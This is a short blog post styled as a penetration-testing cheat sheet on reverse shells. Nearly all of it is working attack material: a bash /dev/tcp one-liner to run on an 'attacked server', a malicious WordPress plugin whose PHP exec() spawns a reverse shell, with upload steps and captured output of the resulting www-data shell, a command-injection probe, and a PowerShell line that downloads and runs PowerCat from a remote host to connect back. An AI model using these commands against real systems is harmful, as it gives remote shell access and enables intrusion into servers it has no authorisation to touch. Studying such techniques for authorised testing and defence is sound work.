---
layout: post
title: "Reverse Shells"
date: 2023-10-17
categories: [CHEATSHEET]
---

## Reverse Shell via Bash TCP

We start by Listening in our host first `~$ nc -nvlp PORT_NUMBER` ; then we execute the below command on the attacked server:


> ***Note:***
>
> To ensure our reverse shell is executed via bash, make sure to add `bash -c`


  
```bash
bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"
```

  
Check this [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/){:target="_blank"} by swissky.

## Reverse Shell via Wordpress Plugin

Create a new wordpress plugin using the simple php file below

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'");
?>
```



In order to upload the shell as a plugin, we need to zip it first then upload it as a plugin via `wp-admin`

```shell
zip reverse-shell.zip reverse-shell.php
```


![](https://jawad.ca/images/revshell.png)


after activating it,  use netcat to listen on port 443 and catch the shell

```shell
$ nc -lvp 443
                  
listening on [any] 443 ...
connect to [IP_ADDRESS] from [IP_ADDRESS]
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

www-data@example:/var/www/html/wp-admin$ pwd
pwd
/var/www/html/wp-admin
```


  

## Command Injection Quick Tips  

### PowerCat Location on Kali  

  
```shell
/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps
```

### Starting a Python Server on port 80  

 
```shell
python3 -m http.server 80
```

### Determining Command Execution Environment

To determine if commands are executed by CMD or PowerShell:  

```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo Powershell
```

To create a reverse shell by downloading PowerCat and connecting to a Netcat listener:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://example.com/powercat.ps1");powercat -c [IP] -p [PORT] -e powershell
```

Replace `[IP]` and `[PORT]` with the appropriate IP address and port number for your Netcat listener.

<br><br>

#### Resources:
* [https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell){:target="_blank"}
* [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp){:target="_blank"}
